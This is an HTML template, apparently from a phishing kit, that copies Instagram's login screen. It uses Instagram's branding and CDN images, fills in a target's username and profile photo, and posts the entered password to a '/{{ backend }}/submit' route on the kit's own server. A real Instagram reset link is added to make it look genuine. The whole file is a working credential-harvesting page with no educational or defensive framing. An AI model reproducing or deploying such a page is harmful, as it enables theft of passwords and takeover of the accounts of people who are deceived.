{% extends 'base.html' %}

{% block head %}
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="https://static.cdninstagram.com/rsrc.php/v3/yR/r/hexDR1NOpRC.png">
  <link rel="Icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
  <title>Instagram</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/login.css') }}">
{% endblock %}

{% block body %}
  <div class="header">
    <a onclick="goBack()">
      <img src="{{ url_for('static', filename='img/arrow.png') }}" alt="" srcset="">
    </a>
  </div>
  <div class="container">
    <div class="profile-container">
      <img class="profile" src="{{ pfp }}">
    </div>
    <p class="username">{{ username }}</p>
    <form action="/{{ backend }}/submit" method="post">
      <input name="password" type="password" placeholder="Password" width="75%">
      <div class="save-container">
        <input class="form-check-input small" type="checkbox" id="flexCheckDefault" checked>
        <p>Save password</p>
      </div>
      <button class="login-button" type="submit">Log in</button>
    </form>
    <div class="fp-container">
      <p>Forgot your login details?</p>
      <a href="https://www.instagram.com/accounts/password/reset/?hl=en">Get help logging in.</a>
    </div>
  </div>
  <div class="footer">
    <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg">
  </div>

  <script>
    function goBack() {
      window.history.back()
    }
  </script>
{% endblock %}
